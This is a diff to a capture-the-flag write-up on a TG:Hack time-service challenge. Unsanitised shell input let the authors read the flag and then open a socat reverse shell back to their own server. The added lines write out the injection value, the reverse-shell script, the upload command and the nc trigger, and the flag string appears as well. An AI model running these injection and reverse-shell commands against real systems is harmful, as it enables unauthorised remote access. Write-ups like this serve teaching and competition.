@@ -26,7 +26,7 @@ and the current time.
 The server side code did this by running a shell command, and the input wasn't 
 sanitized.
 
-We got the flag by entering $(cat flag.txt) as the name. It was TG17{tick_t0ck_arbitrary_c0de_execution}.
+We got the flag by entering `$(cat flag.txt)` as the name. It was `TG17{tick_t0ck_arbitrary_c0de_execution}`.
 
 But then we looked around some more, and discovered that /tmp was writeable and
 executable, and gcc was also installed. A peek at the files in /etc confirmed our guess
@@ -90,15 +90,29 @@ echo "Executable at $DEST.sh"
 ```
 
 Some more exploring reveled that they hadn't blocked outgoing connections from the
-docker image, so we uploaded a reverse shell and on our server we did:
+docker image, so we created the reverse shell binary:
+
+```bash
+#!/bin/bash
+socat tcp:$1:$2 exec:"bash -i",pty,stderr,setsid,sigint,sane
+```
+
+uploaded it to the server:
+
+```bash
+ncupl time.tghack.no 1111 ./reverse-shell.sh c
+```
+
+started listening for connections on our own server:
 
 ```bash
 socat -,raw,echo=0 tcp-listen:14243
 ```
 
-and executed the shell with:
+then initiated the reverse shell connection from the remote host:
+
 ```bash
-echo '$(/tmp/c <serverip> 14243)' | nc time.tghack.no 1111
+echo '$(/tmp/c.sh <our serverip> 14243)' | nc time.tghack.no 1111
 ```
 
 This made it a lot easier to explore the system, unfortunately other obligations came
